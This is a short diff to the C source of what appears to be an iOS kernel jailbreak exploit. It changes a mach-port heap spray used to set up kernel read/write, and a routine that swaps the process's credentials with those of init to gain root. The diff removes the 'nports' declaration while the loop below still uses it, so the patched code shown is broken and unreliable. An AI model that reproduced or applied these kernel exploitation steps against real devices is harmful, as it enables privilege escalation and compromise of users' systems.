@@ -511,7 +511,6 @@ void wk64(uint64_t address, uint64_t value){
 uint64_t prepare_kernel_rw() {
   int prealloc_size = 0x900; // kalloc.4096
   
-  const int nports = 40000;
   mach_port_t *ports = malloc(nports * sizeof(mach_port_t));
   sleep(1);
   for (int i = 0; i < nports; i++){
@@ -849,13 +848,8 @@ unjail(void)
     uint64_t init_cred = kread_uint64(init_proc + offsetof_p_ucred);
     kwrite_uint64(our_proc + offsetof_p_ucred, init_cred);
 
-#if 0
-    uint64_t val = kread_uint64(kernel_base);
-    printf("read from kernel memory: 0x%016llx\n", val);
-#else
-    extern int unjail2(uint64_t surfacevt);
-    rv = unjail2(surfacevt);
-#endif
+    extern int unjail2(void);
+    rv = unjail2();
 
     kwrite_uint64(our_proc + offsetof_p_ucred, our_cred);
     return rv;
